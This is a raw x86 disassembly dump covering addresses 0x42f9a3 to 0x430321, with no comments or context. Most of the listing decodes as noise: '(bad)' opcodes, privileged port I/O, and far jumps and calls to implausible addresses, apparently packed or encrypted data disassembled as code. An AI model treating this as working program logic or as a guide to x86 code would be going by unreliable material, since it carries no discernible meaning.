  42f9a3:	lahf   
  42f9a4:	xor    eax,esi
  42f9a6:	jae    0x42f980
  42f9a8:	daa    
  42f9a9:	push   ds
  42f9aa:	daa    
  42f9ab:	cdq    
  42f9ac:	lods   eax,DWORD PTR ds:[esi]
  42f9ad:	pop    es
  42f9ae:	test   eax,0x63b7d275
  42f9b3:	add    ch,BYTE PTR [eax-0x580fef07]
  42f9b9:	mov    bh,ah
  42f9bb:	je     0x42f9fa
  42f9bd:	rcl    DWORD PTR [eax-0x3c80323f],1
  42f9c3:	in     al,dx
  42f9c4:	xor    edx,DWORD PTR [esi-0x7860650d]
  42f9ca:	push   edi
  42f9cb:	popf   
  42f9cc:	cli    
  42f9cd:	hlt    
  42f9ce:	mov    bl,0xf0
  42f9d0:	or     BYTE PTR [ebp+0x23],dl
  42f9d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f9d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f9d6:	(bad)  
  42f9d7:	jmp    0x42fa17
  42f9d9:	push   ebp
  42f9da:	mov    bh,BYTE PTR [ebp-0x243e096]
  42f9e0:	outs   dx,BYTE PTR ds:[esi]
  42f9e1:	fbstp  TBYTE PTR [esi]
  42f9e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f9e4:	fmul   QWORD PTR [ecx+0x23]
  42f9e7:	out    dx,al
  42f9e8:	call   0xe1bc3610
  42f9ed:	push   ds
  42f9ee:	iret   
  42f9ef:	loopne 0x42fa2c
  42f9f1:	lahf   
  42f9f2:	jle    0x42f9e7
  42f9f4:	add    eax,0xe100494d
  42f9f9:	dec    ecx
  42f9fa:	imul   ebp,DWORD PTR [esi],0xffffffb8
  42f9fd:	mov    cl,0xae
  42f9ff:	in     al,0x90
  42fa01:	xor    DWORD PTR [eax-0x2b0884c9],0x2c
  42fa08:	sbb    BYTE PTR [edi],dl
  42fa0a:	pop    edx
  42fa0b:	(bad)  
  42fa0d:	push   ebx
  42fa0e:	pusha  
  42fa0f:	push   eax
  42fa10:	mov    eax,0xc63bd5ac
  42fa15:	cmp    ch,dl
  42fa17:	xor    DWORD PTR ds:0x1252bc62,edx
  42fa1d:	js     0x42fa0c
  42fa1f:	arpl   WORD PTR [eax-0x10],bp
  42fa22:	sbb    al,BYTE PTR [edi]
  42fa24:	retf   
  42fa25:	stos   BYTE PTR es:[edi],al
  42fa26:	loopne 0x42fa54
  42fa28:	fadd   DWORD PTR [eax+0x60c5cb8d]
  42fa2e:	dec    BYTE PTR [edx]
  42fa30:	dec    esp
  42fa31:	xchg   edx,eax
  42fa32:	mov    ch,0xc8
  42fa34:	push   edx
  42fa35:	ret    
  42fa36:	mov    esp,0xcc82931e
  42fa3b:	mov    ebp,0x797c8ef3
  42fa40:	out    dx,eax
  42fa41:	jle    0x42f9d5
  42fa43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa44:	or     al,0xda
  42fa46:	ins    BYTE PTR es:[edi],dx
  42fa47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa48:	mov    ch,0x5c
  42fa4a:	jecxz  0x42fa68
  42fa4c:	or     al,BYTE PTR [ebp+0x4e]
  42fa4f:	shl    dh,1
  42fa51:	cmp    al,BYTE PTR [edx-0x7b]
  42fa54:	rol    BYTE PTR [ebx+ecx*2-0x77],cl
  42fa58:	inc    edi
  42fa59:	sar    BYTE PTR [eax-0x2a],1
  42fa5c:	loopne 0x42fa12
  42fa5e:	mov    DWORD PTR [edx],esp
  42fa60:	aas    
  42fa61:	push   eax
  42fa62:	mov    ds:0x3acebef1,al
  42fa67:	fisttp DWORD PTR [eax]
  42fa69:	mov    eax,ds:0xab21411a
  42fa6e:	jecxz  0x42fa52
  42fa70:	sbb    al,0xf9
  42fa72:	div    ebx
  42fa74:	cmp    eax,0x577cbc5
  42fa79:	test   al,0x8e
  42fa7b:	dec    edi
  42fa7c:	inc    ecx
  42fa7d:	sbb    al,0xe1
  42fa7f:	(bad)  
  42fa80:	or     eax,0x9eaad11a
  42fa85:	(bad)  
  42fa87:	sub    al,0x1d
  42fa89:	test   DWORD PTR [edi-0x3a57d3d2],ebp
  42fa8f:	scas   eax,DWORD PTR es:[edi]
  42fa90:	push   esp
	...
  42faf1:	add    BYTE PTR [eax],al
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	in     al,dx
  42fb01:	iret   
  42fb02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fb03:	sub    al,0xa4
  42fb05:	inc    DWORD PTR [ecx]
  42fb07:	add    BYTE PTR ds:0xd000001,al
  42fb0d:	lods   al,BYTE PTR ds:[esi]
  42fb0e:	dec    ebp
  42fb0f:	jl     0x42fabc
  42fb11:	js     0x42fab2
  42fb13:	out    dx,eax
  42fb14:	mov    ds:0xa9374dce,eax
  42fb19:	mov    dl,0xa
  42fb1b:	mov    esp,0xbebf4da4
  42fb20:	cmp    eax,0xe7bebcd1
  42fb25:	sub    DWORD PTR [ecx-0x6],eax
  42fb28:	das    
  42fb29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb2a:	adc    BYTE PTR ds:[eax+0x77],0xc2
  42fb2f:	fldenv [ebx+0x68eb6a82]
  42fb36:	inc    edi
  42fb37:	dec    ecx
  42fb38:	out    0x5e,al
  42fb3a:	lock sub ebp,DWORD PTR [edi+esi*1-0x67a10845]
  42fb42:	push   edi
  42fb43:	int3   
  42fb44:	sbb    BYTE PTR [ecx+esi*4-0x32eaf366],ch
  42fb4b:	icebp  
  42fb4c:	jne    0x42fbb2
  42fb4e:	enter  0xfe81,0x5e
  42fb52:	adc    al,0x2c
  42fb54:	lods   eax,DWORD PTR ds:[esi]
  42fb55:	test   bl,0x4a
  42fb58:	xor    esp,DWORD PTR [edi]
  42fb5a:	into   
  42fb5b:	retf   
  42fb5c:	or     ebp,DWORD PTR [edi]
  42fb5e:	add    BYTE PTR [ebx-0x70],dl
  42fb61:	sub    eax,0x9e618a8d
  42fb66:	mov    ebp,0x674ec2fe
  42fb6b:	sbb    eax,0x267a6f67
  42fb70:	daa    
  42fb71:	call   0xb71e:0x4a338e2f
  42fb78:	ror    DWORD PTR [edi],cl
  42fb7a:	pusha  
  42fb7b:	and    al,0xd5
  42fb7d:	push   es
  42fb7e:	inc    edx
  42fb7f:	mov    DWORD PTR [esi+0x34],ebp
  42fb82:	(bad)  
  42fb83:	call   0xbdac60f6
  42fb88:	sbb    BYTE PTR [esi+esi*2-0x2b4483f2],bh
  42fb8f:	gs in  al,dx
  42fb91:	enter  0x2dcf,0x51
  42fb95:	fwait
  42fb96:	push   esp
  42fb97:	out    0xa9,eax
  42fb99:	ins    BYTE PTR es:[edi],dx
  42fb9a:	(bad)  
  42fb9c:	(bad)  
  42fb9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb9e:	push   edx
  42fb9f:	in     al,0xfb
  42fba1:	loope  0x42fbfc
  42fba3:	jbe    0x42fbc4
  42fba5:	or     eax,DWORD PTR [eax-0x15]
  42fba8:	xchg   ebx,eax
  42fba9:	jg     0x42fb67
  42fbab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fbac:	ins    BYTE PTR es:[edi],dx
  42fbad:	push   edx
  42fbae:	mov    ecx,0x4f3f02ec
  42fbb3:	cmc    
  42fbb4:	cmp    ah,bh
  42fbb6:	daa    
  42fbb7:	fst    st(2)
  42fbb9:	pop    ebp
  42fbba:	add    ah,ah
  42fbbc:	pop    ebx
  42fbbd:	and    al,0x81
  42fbbf:	pop    es
  42fbc0:	popa   
  42fbc1:	xchg   esi,eax
  42fbc2:	daa    
  42fbc3:	lods   al,BYTE PTR ds:[esi]
  42fbc4:	mov    WORD PTR [esp+esi*1],ds
  42fbc7:	dec    edx
  42fbc8:	pop    ds
  42fbc9:	out    dx,al
  42fbca:	add    DWORD PTR cs:[esi+0x3e55073b],esi
  42fbd1:	mov    eax,DWORD PTR [edx+esi*4+0x4a]
  42fbd5:	stc    
  42fbd6:	jmp    0x42fbfc
  42fbd8:	fld    QWORD PTR [edi-0x5cca70f4]
  42fbde:	adc    cl,dl
  42fbe0:	mov    ?,WORD PTR [eax]
  42fbe2:	rcr    DWORD PTR [edi+0x6fb03a1f],cl
  42fbe8:	sbb    ebx,DWORD PTR [edi+0x6dddc7d5]
  42fbee:	popa   
  42fbef:	mov    esp,0x7e4dec3
  42fbf4:	mov    esp,eax
  42fbf6:	les    ecx,FWORD PTR [ecx+0x798029ae]
  42fbfc:	not    DWORD PTR [edx-0x160e05a6]
  42fc02:	mov    al,0xaa
  42fc04:	sbb    al,BYTE PTR [eax+0x64cf3885]
  42fc0a:	cdq    
  42fc0b:	test   DWORD PTR [esp+edx*1+0x52a218],edi
	...
  42fc72:	add    BYTE PTR [eax],al
  42fc74:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc7a:	mov    ebx,0x36325e9a
  42fc7f:	and    dh,dh
  42fc81:	jmp    0xeccc6d
  42fc86:	add    al,BYTE PTR [eax]
  42fc88:	add    eax,0xa8000001
  42fc8d:	imul   edx,DWORD PTR [edx+0x3c],0xcd197e3a
  42fc94:	sbb    BYTE PTR ds:0x43d82953,al
  42fc9a:	test   DWORD PTR [ebx-0xdd66c18],edi
  42fca0:	or     eax,0x1d1b69c0
  42fca5:	call   0x1fdd53fc
  42fcaa:	jbe    0x42fc87
  42fcac:	push   ds
  42fcad:	pop    edx
  42fcae:	leave  
  42fcaf:	adc    ch,bl
  42fcb1:	fst    QWORD PTR [edi-0x35]
  42fcb4:	pushf  
  42fcb5:	mov    esp,0x9744a94c
  42fcba:	and    al,0x34
  42fcbc:	je     0x42fc92
  42fcbe:	out    0x5,eax
  42fcc0:	push   ss
  42fcc1:	push   0xb
  42fcc3:	xchg   ebx,eax
  42fcc4:	scas   al,BYTE PTR es:[edi]
  42fcc5:	push   ss
  42fcc6:	push   ecx
  42fcc7:	cmp    DWORD PTR [ecx],ebp
  42fcc9:	sbb    DWORD PTR [edx-0x85519b3],edi
  42fccf:	cdq    
  42fcd0:	mov    esi,0x700dc446
  42fcd5:	(bad)  
  42fcd7:	mov    es:0x9fee1a57,al
  42fcdd:	adc    ebp,ebp
  42fcdf:	mov    ds:0x5fef7124,eax
  42fce4:	pop    edi
  42fce5:	jge    0x42fcb2
  42fce7:	lods   al,BYTE PTR ds:[esi]
  42fce8:	and    BYTE PTR [ecx*4+0x717dacf1],al
  42fcef:	xchg   DWORD PTR [edi-0x7373c9e7],ebp
  42fcf5:	lock jno 0x42fcd7
  42fcf8:	inc    esp
  42fcf9:	sub    DWORD PTR [ebp-0x66297e32],0x7d
  42fd00:	inc    esp
  42fd01:	fcom   QWORD PTR [esi]
  42fd03:	gs mov ah,0xe8
  42fd06:	fwait
  42fd07:	adc    BYTE PTR [esi-0x53],cl
  42fd0a:	xchg   esp,eax
  42fd0b:	adc    eax,DWORD PTR [eax-0x18]
  42fd0e:	(bad)  
  42fd0f:	out    0x2f,eax
  42fd11:	xchg   ecx,eax
  42fd12:	jns    0x42fd88
  42fd14:	jge    0x42fd01
  42fd16:	clc    
  42fd17:	xor    al,0xa8
  42fd19:	fstp   TBYTE PTR [ecx+edi*2]
  42fd1c:	jbe    0x42fd60
  42fd1e:	pop    esp
  42fd1f:	vpmacssdql ymm10,ymm7,ymm4,YMMWORD PTR [eax]
  42fd25:	in     al,0xc6
  42fd27:	mov    ah,bl
  42fd29:	stos   DWORD PTR es:[edi],eax
  42fd2a:	into   
  42fd2b:	mov    DWORD PTR [esi+0x7517e7f9],edi
  42fd31:	inc    edi
  42fd32:	jae    0x42fd48
  42fd34:	pop    es
  42fd35:	bound  esp,QWORD PTR [edi+0x6e97acd9]
  42fd3b:	rdpmc  
  42fd3d:	sahf   
  42fd3e:	repz cwde 
  42fd40:	fst    DWORD PTR [esi-0x44]
  42fd43:	out    0x47,al
  42fd45:	xchg   ebx,eax
  42fd46:	sub    eax,0x56e65bad
  42fd4b:	pop    eax
  42fd4c:	rcl    BYTE PTR [ebx-0x29d13b97],1
  42fd52:	jmp    0x5ea69732
  42fd57:	pop    ds
  42fd58:	and    esi,DWORD PTR [edi]
  42fd5a:	es aad 0xa7
  42fd5d:	fsubr  st(7),st
  42fd5f:	pop    ebp
  42fd60:	xchg   cl,dl
  42fd62:	xchg   esi,ebx
  42fd64:	retf   
  42fd65:	jle    0x42fcfb
  42fd67:	jmp    0xdc140130
  42fd6c:	sbb    edx,DWORD PTR [ebx]
  42fd6e:	cmc    
  42fd6f:	imul   eax,DWORD PTR [edx+0x619468fd],0x245dfb72
  42fd79:	add    BYTE PTR [ecx],dl
  42fd7b:	mov    ch,0xc2
  42fd7d:	jne    0x42fd73
  42fd7f:	(bad)  
  42fd80:	neg    DWORD PTR [esi+0x116e1cf1]
  42fd86:	scas   al,BYTE PTR es:[edi]
  42fd87:	inc    esp
  42fd88:	in     eax,0x85
  42fd8a:	in     eax,dx
  42fd8b:	loope  0x42fd51
  42fd8d:	mov    bh,0x86
  42fd8f:	gs jb  0x42fd92
	...
  42fdf2:	add    BYTE PTR [eax],al
  42fdf4:	dec    eax
  42fdf5:	rol    dl,0xf0
  42fdf8:	retf   0x7af2
  42fdfb:	clc    
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	rep lods eax,DWORD PTR ds:[esi]
  42fe01:	pop    ecx
  42fe02:	adc    ah,bh
  42fe04:	scas   al,BYTE PTR es:[edi]
  42fe05:	add    DWORD PTR [edx],eax
  42fe07:	add    BYTE PTR ds:0x91000001,al
  42fe0d:	mov    bl,0xfb
  42fe0f:	jp     0x42fe16
  42fe11:	inc    ecx
  42fe12:	fwait
  42fe13:	pop    esp
  42fe14:	and    cl,BYTE PTR [edi-0x3]
  42fe17:	shr    DWORD PTR [edx-0x5d],0x19
  42fe1b:	dec    esp
  42fe1c:	xchg   edi,eax
  42fe1d:	dec    edx
  42fe1e:	add    DWORD PTR [ecx-0x340d1f59],edx
  42fe24:	lea    esp,[edx]
  42fe26:	loopne 0x42fe71
  42fe28:	ins    DWORD PTR es:[edi],dx
  42fe29:	add    BYTE PTR [edx],bh
  42fe2b:	mov    ecx,0xd7230dad
  42fe30:	sbb    edi,edi
  42fe32:	out    dx,eax
  42fe33:	es (bad) 
  42fe35:	xchg   ecx,eax
  42fe36:	ins    BYTE PTR es:[edi],dx
  42fe37:	jmp    0xe7fc:0xd9998114
  42fe3e:	adc    al,0x3a
  42fe40:	jae    0x42fdeb
  42fe42:	leave  
  42fe43:	out    0xb5,eax
  42fe45:	xchg   esp,eax
  42fe46:	lds    eax,FWORD PTR fs:[ecx]
  42fe49:	push   esi
  42fe4a:	fcom   QWORD PTR [edi-0x6e]
  42fe4d:	pop    edx
  42fe4e:	dec    ebx
  42fe4f:	fistp  DWORD PTR [ecx-0xf305466]
  42fe55:	cmp    cl,dh
  42fe57:	dec    esp
  42fe58:	xor    al,0xfa
  42fe5a:	es mov esp,0x6f9e5820
  42fe60:	push   cs
  42fe61:	pop    edi
  42fe62:	mov    ds:0x1c07411c,al
  42fe67:	les    esp,FWORD PTR [ecx-0x67]
  42fe6a:	and    cl,cl
  42fe6c:	jo     0x42fe2c
  42fe6e:	xor    al,0xc0
  42fe70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fe71:	rcr    DWORD PTR [ecx+0x2f909685],1
  42fe77:	sbb    BYTE PTR [ebx],0x39
  42fe7a:	test   BYTE PTR [esp+edx*1-0x1d],ch
  42fe7e:	test   ch,0xcb
  42fe81:	xchg   edx,eax
  42fe82:	fwait
  42fe83:	scas   eax,DWORD PTR es:[edi]
  42fe84:	sahf   
  42fe85:	jle    0x42fed3
  42fe87:	idiv   al
  42fe89:	inc    ebx
  42fe8a:	fdiv   st(0),st
  42fe8c:	pop    eax
  42fe8d:	mov    ebp,0xba176542
  42fe92:	(bad)  
  42fe93:	push   eax
  42fe94:	push   es
  42fe95:	xchg   edi,eax
  42fe96:	or     al,bh
  42fe98:	ror    BYTE PTR [ecx-0x7bd12931],1
  42fe9e:	jg     0x42ff14
  42fea0:	cmp    DWORD PTR [eax-0x15fded9b],edx
  42fea6:	popf   
  42fea7:	or     al,0xb1
  42fea9:	dec    edi
  42feaa:	mov    ch,0x6b
  42feac:	aam    0xd
  42feae:	int    0xd6
  42feb0:	xor    eax,0x6ff79e9f
  42feb5:	ins    DWORD PTR es:[edi],dx
  42feb6:	cli    
  42feb7:	lods   eax,DWORD PTR ds:[esi]
  42feb8:	sar    BYTE PTR [edi-0x62],1
  42febb:	sub    DWORD PTR [ecx+ecx*2-0x22c9e532],eax
  42fec2:	fbstp  TBYTE PTR [edi]
  42fec4:	push   ebp
  42fec5:	out    dx,al
  42fec6:	sub    bl,BYTE PTR [edi-0x4e1078f6]
  42fecc:	pop    ecx
  42fecd:	fadd   QWORD PTR [eax-0x4e2754cf]
  42fed3:	into   
  42fed4:	jo     0x42ff54
  42fed6:	add    BYTE PTR [edx-0x7f4123ca],dh
  42fedc:	in     eax,0xb8
  42fede:	adc    esi,esp
  42fee0:	clc    
  42fee1:	mov    eax,ds:0x4640ede6
  42fee6:	mov    eax,ds:0x6aef704e
  42feeb:	jle    0x42ff32
  42feed:	aas    
  42feee:	add    DWORD PTR [esi-0x7d],esi
  42fef1:	push   ds
  42fef2:	sub    bh,BYTE PTR [eax-0x63]
  42fef5:	jb     0x42feb9
  42fef7:	dec    esp
  42fef8:	cwde   
  42fef9:	je     0x42fe8d
  42fefb:	push   esi
  42fefc:	repz es std 
  42feff:	sub    al,0xb6
  42ff01:	mov    ch,0xfc
  42ff03:	pushf  
  42ff04:	inc    ecx
  42ff05:	imul   ecx,DWORD PTR [eax-0x51],0xffffffa3
  42ff09:	pop    edi
  42ff0a:	push   esp
  42ff0b:	mov    esp,0x1d68e966
  42ff10:	mov    esp,0x0
	...
  42ff71:	add    BYTE PTR [eax],al
  42ff73:	add    BYTE PTR [edi+eiz*2],al
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [edi+ebx*4+0x3f],0xf3
  42ff83:	adc    eax,0x202b3
  42ff88:	add    eax,0x51000001
  42ff8d:	ins    DWORD PTR es:[edi],dx
  42ff8e:	inc    ecx
  42ff8f:	repnz rcl DWORD PTR [ebx-0x148e7a2d],1
  42ff96:	xchg   ebp,eax
  42ff97:	and    edi,DWORD PTR [eax-0x23]
  42ff9a:	iret   
  42ff9b:	dec    edx
  42ff9c:	add    BYTE PTR [esi+0x59a800ea],0xeb
  42ffa3:	cmp    BYTE PTR [edi+0x7c1f4537],ch
  42ffa9:	push   ds
  42ffaa:	stos   BYTE PTR es:[edi],al
  42ffab:	mov    gs,WORD PTR [ecx+0x22141db8]
  42ffb1:	cwde   
  42ffb2:	xchg   ebp,eax
  42ffb3:	mov    esp,0x513d84ae
  42ffb8:	int3   
  42ffb9:	inc    edx
  42ffba:	mov    BYTE PTR [edi+0xf],0x1f
  42ffbe:	repz out dx,al
  42ffc0:	cmp    dh,BYTE PTR [ebx+eiz*1-0x31baeeb7]
  42ffc7:	aaa    
  42ffc8:	push   ecx
  42ffc9:	rol    DWORD PTR [edi+0x897bbf7],0xb5
  42ffd0:	sub    edx,ebp
  42ffd2:	loop   0x42ff7f
  42ffd4:	dec    ebp
  42ffd5:	ins    DWORD PTR es:[edi],dx
  42ffd6:	loope  0x43000c
  42ffd8:	adc    eax,0x385cb82a
  42ffdd:	mov    cl,0xa7
  42ffdf:	mov    dl,0x7f
  42ffe1:	adc    eax,0xe25268b4
  42ffe6:	lods   al,BYTE PTR ds:[esi]
  42ffe7:	das    
  42ffe8:	sahf   
  42ffe9:	xchg   ebp,eax
  42ffea:	xchg   edx,eax
  42ffeb:	jle    0x42ffbd
  42ffed:	mov    WORD PTR [edx-0x9d0f5e],gs
  42fff3:	(bad)  
  42fff4:	fidiv  WORD PTR [esi+edi*8+0x32]
  42fff8:	fisub  WORD PTR [ecx+edi*1]
  42fffb:	repnz lahf 
  42fffd:	adc    BYTE PTR [ecx-0x671d3da0],0x1e
  430004:	add    DWORD PTR [ebp-0xfa86f0b],ebx
  43000a:	out    dx,eax
  43000b:	outs   dx,DWORD PTR ds:[esi]
  43000c:	jmp    0xd61eef78
  430011:	into   
  430012:	pop    ebp
  430013:	push   0xb263fdbd
  430018:	out    0x18,eax
  43001a:	push   0xfffffffd
  43001c:	mov    eax,ds:0xcfb25fdc
  430021:	mov    edi,0x1370e794
  430026:	dec    edx
  430027:	aam    0xe0
  430029:	adc    eax,0x63cd368
  43002e:	sub    BYTE PTR [esp+eax*1+0x4c],dl
  430032:	push   esp
  430033:	test   cl,al
  430035:	stc    
  430036:	lahf   
  430037:	add    ecx,edx
  430039:	pop    esi
  43003a:	inc    edi
  43003b:	nop
  43003c:	sbb    dl,BYTE PTR [edx+0x5a]
  43003f:	sar    BYTE PTR [ebp-0x7d732e21],1
  430045:	pop    es
  430046:	mov    al,0x8b
  430048:	mov    ds:0x6fb15e7b,al
  43004d:	xchg   ebx,eax
  43004e:	mov    ds:0x875bf903,eax
  430053:	(bad)  
  430054:	mov    ds:0xd10ff8e3,eax
  430059:	mov    ecx,DWORD PTR [ecx]
  43005b:	or     al,0xcd
  43005d:	stc    
  43005e:	sub    dl,bl
  430060:	fnstcw WORD PTR [edx]
  430062:	xor    al,BYTE PTR [edx+0x73]
  430065:	push   esi
  430066:	ins    BYTE PTR es:[edi],dx
  430067:	push   edi
  430068:	aam    0xe4
  43006a:	inc    ebp
  43006b:	(bad)
  43006e:	and    ch,BYTE PTR [ebx+0x38]
  430071:	jbe    0x4300e9
  430073:	push   es
  430074:	and    al,0x80
  430076:	out    0x52,eax
  430078:	shl    DWORD PTR [ecx-0x43e535dd],cl
  43007e:	ret    0x7c4
  430081:	bswap  esp
  430083:	mov    ds:0xec47f966,al
  430088:	call   FWORD PTR [esi]
  43008a:	std    
  43008b:	ret    
  43008c:	push   edi
  43008d:	sbb    eax,0x3c04c3
	...
  4300f2:	add    BYTE PTR [eax],al
  4300f4:	(bad)  
  4300f5:	ins    DWORD PTR es:[edi],dx
  4300f6:	aam    0xb5
  4300f8:	(bad)  
  4300f9:	mov    ebp,0x9547fe7
  4300fe:	scas   eax,DWORD PTR es:[edi]
  4300ff:	add    al,0x91
  430101:	sub    ebx,DWORD PTR [ebx+0x63]
  430104:	mov    eax,0x18000203
  430109:	add    BYTE PTR [eax],al
  43010b:	add    BYTE PTR [edi-0x5c6632fb],bh
  430111:	outs   dx,DWORD PTR ds:[esi]
  430112:	push   eax
  430113:	imul   esp,DWORD PTR [esi],0x2c
  430116:	in     eax,dx
  430117:	into   
  430118:	sbb    DWORD PTR [ecx-0x5b],esp
  43011b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43011c:	cmp    ebx,0x7a
  43011f:	sub    eax,0xf3d37fb
	...
  430174:	dec    ebp
  430175:	push   ebp
  430176:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43017c:	mov    esp,ebp
  43017e:	or     ah,dh
  430180:	dec    ebp
  430181:	add    bh,al
  430183:	add    BYTE PTR [eax],cl
  430185:	add    BYTE PTR [eax],al
  430187:	mov    DWORD PTR [eax],0x40f44545
  43018d:	xor    DWORD PTR [eax],eax
  43018f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430195:	(bad)  
  430196:	enter  0x4d45,0xbc
  43019a:	mov    esi,DWORD PTR [edx]
  43019c:	hlt    
  43019d:	test   ebx,ecx
  43019f:	pushf  
  4301a0:	enter  0x4df8,0x8b
  4301a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4301ab:	inc    ebp
  4301ac:	mov    ebp,0xff8bfffc
  4301b1:	dec    ebp
  4301b2:	mov    ch,0xf4
  4301b4:	call   DWORD PTR [ebx-0x1]
  4301b7:	mov    ebx,0x8005474
  4301bc:	call   DWORD PTR [ecx+0x8]
  4301bf:	pop    es
  4301c0:	jmp    0xb8:0xacb4533
  4301c7:	fwait
  4301c8:	mov    esi,DWORD PTR [edx-0xc]
  4301cb:	xor    cl,bl
  4301cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4301d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4301d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4301df:	xor    eax,DWORD PTR [eax]
  4301e1:	retf   
  4301e2:	retf   
  4301e3:	add    ecx,eax
  4301e5:	enter  0x894d,0x64
  4301e9:	dec    ebp
  4301ea:	sbb    ah,cl
  4301ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4301f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4301f8:	test   DWORD PTR [ebx],esi
  4301fa:	dec    ebx
  4301fc:	inc    DWORD PTR [ebx]
  4301fe:	inc    eax
  4301ff:	enter  0x8989,0x50
  430203:	(bad)  
  430204:	call   DWORD PTR [ebx+ecx*4-0x1]
  430208:	cld    
  430209:	dec    DWORD PTR [ebp-0xa90001]
  43020f:	push   edi
  430210:	mov    BYTE PTR [edx+0x1],ch
  430213:	and    al,BYTE PTR [eax]
  430215:	pop    ecx
  430216:	inc    ebp
  430217:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43021d:	push   0xffffff89
  43021f:	pop    ecx
  430220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430221:	dec    ebp
  430222:	add    BYTE PTR [ecx+0x45fc088b],cl
  430228:	jne    0x430274
  43022a:	lea    eax,[eax]
  43022c:	push   eax
  43022d:	(bad)  
  43022e:	dec    DWORD PTR [eax]
  430230:	mov    DWORD PTR [eax],eax
  430232:	test   al,0x0
  430234:	add    BYTE PTR [ebp-0x18],cl
  430237:	xor    ebp,DWORD PTR [ebx]
  430239:	add    eax,DWORD PTR [eax]
  43023b:	mov    eax,eax
  43023d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430244:	inc    ebp
  430245:	mov    DWORD PTR [ebx+0x459408],ecx
  43024b:	arpl   WORD PTR [ebx-0x372749b],cx
  430251:	sub    al,0x80
  430253:	inc    DWORD PTR [ecx]
  430255:	lea    eax,[eax]
  430257:	or     al,0x0
  430259:	inc    DWORD PTR [ecx-0x18]
  43025c:	mov    ecx,DWORD PTR [ebx]
  43025e:	cld    
  43025f:	add    BYTE PTR [ecx+0x75014d],cl
  430265:	(bad)  
  430266:	xchg   ebp,eax
  430267:	fdivr  st,st(7)
  430269:	inc    eax
  43026a:	inc    DWORD PTR [eax]
  43026c:	mov    ecx,DWORD PTR [ebp-0x4]
  43026f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430275:	add    BYTE PTR [edx],dl
  430277:	enter  0x4d90,0x0
  43027b:	mov    eax,DWORD PTR [eax]
  43027d:	hlt    
  43027e:	add    al,0xa5
  430280:	mov    al,0xff
  430282:	add    bh,bh
  430284:	add    BYTE PTR [ebx],dh
  430286:	inc    DWORD PTR [ebx]
  430288:	sbb    al,0x89
  43028a:	jne    0x430268
  43028c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430292:	mov    eax,DWORD PTR [ebp-0xff0048]
  430298:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43029f:	inc    DWORD PTR [ebp-0x75]
  4302a2:	fisttp QWORD PTR [esi+ebp*8]
  4302a5:	test   DWORD PTR [esi-0x1],esp
  4302a8:	inc    ebp
  4302a9:	(bad)  
  4302aa:	aas    
  4302ab:	inc    ebp
  4302ac:	(bad)  
  4302ad:	lea    edi,[esp+eiz*2-0x1]
  4302b1:	inc    edi
  4302b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4302b9:	mov    ebp,esp
  4302bb:	cld    
  4302bc:	loop   0x43024b
  4302be:	inc    ebp
  4302bf:	(bad)  
  4302c0:	out    dx,al
  4302c1:	(bad)  
  4302c2:	fisttp WORD PTR [eax+0x8801c7]
  4302c8:	jecxz  0x43030f
  4302ca:	in     al,dx
  4302cb:	inc    DWORD PTR [ebp-0x4]
  4302ce:	out    0x8d,eax
  4302d0:	aas    
  4302d1:	inc    edi
  4302d3:	jmp    FWORD PTR [eax-0x78]
  4302d6:	inc    DWORD PTR [ecx]
  4302d8:	mov    DWORD PTR [eax],0xc7043d
  4302de:	ins    BYTE PTR es:[edi],dx
  4302df:	test   edi,edi
  4302e1:	pandn  mm0,mm5
  4302e4:	aas    
  4302e5:	add    bh,al
  4302e7:	mov    esi,DWORD PTR [eax-0x4]
  4302ea:	inc    DWORD PTR [eax+0xdf01ee]
  4302f0:	(bad)  
  4302f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4302f5:	mov    ebp,ebx
  4302f7:	xchg   esp,eax
  4302f8:	fild   DWORD PTR [eax]
  4302fa:	(bad)  
  4302fb:	mov    edi,DWORD PTR [eax+0x3]
  4302fe:	(bad)  
  4302ff:	cmp    al,0xe7
  430301:	dec    ebp
  430302:	leave  
  430303:	mov    ebp,eax
  430305:	fsubr  DWORD PTR [edx]
  430307:	add    BYTE PTR [eax],al
  430309:	lea    ecx,[ebx-0x7f0003b4]
  43030f:	push   edx
  430310:	add    DWORD PTR [ebp+0x0],edx
  430313:	mov    esi,DWORD PTR [eax]
  430315:	mov    WORD PTR [edi],ss
  430317:	add    BYTE PTR [eax],al
  430319:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43031f:	add    ah,bh
  430321:	push   0x7d
